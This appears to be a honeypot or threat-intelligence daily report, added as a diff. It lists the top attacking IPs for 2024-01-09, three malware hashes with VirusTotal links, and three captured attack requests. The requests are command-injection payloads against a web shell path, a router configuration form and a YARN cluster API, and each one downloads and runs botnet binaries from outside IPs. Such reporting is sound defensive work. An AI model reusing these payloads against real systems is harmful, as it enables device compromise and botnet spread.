@@ -1,0 +1,36 @@
+Top 5 IPs for 2024-01-09:
+
+182.91.13.215
+87.225.88.9
+152.32.72.55
+143.110.174.74
+143.110.211.56
+
+Malware download: 
+168c689463606a3a6444767e445ffbfda5559926b684526f6d0b59d8be224a05
+https://www.virustotal.com/gui/file/168c689463606a3a6444767e445ffbfda5559926b684526f6d0b59d8be224a05
+35e77ce34d635924ba8b731110b1c382288f7c8728c85620565b343176e3d28c
+https://www.virustotal.com/gui/file/35e77ce34d635924ba8b731110b1c382288f7c8728c85620565b343176e3d28c
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+
+
+Malicious commands seen:
+
+/shell?cd+/tmp;rm+popbang.arm4+popbang.arm7;wget+http:/\\/37.221.94.56/popbang.arm7;chmod+777+popbang.arm7;./popbang.arm7+tacos;wget+http:/\\/37.221.94.56/popbang.arm4;chmod+777+popbang.arm4;./popbang.arm4+tacos
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://103.180.149.62/skyljne.mpsl; chmod 777 skyljne.mpsl; ./skyljne.mpsl lblink.selfrep;
+
+
+POST /ws/v1/cluster/apps HTTP/1.1
+Host: <HOST>
+User-Agent: Hello World
+Accept: */*
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: 287
+
+{\"application-id\": \"\", \"application-name\": \"get-shell\", \"am-container-spec\": {\"commands\": {\"command\": \"cd /tmp; rm -rf skid.x86; wget http://45.95.147.172/skid.x86; curl http://45.95.147.172/skid.x86 --output skid.x86; chmod 777 skid.x86; ./skid.x86 Yarn;\"}}, \"application-type\": \"YARN\"}
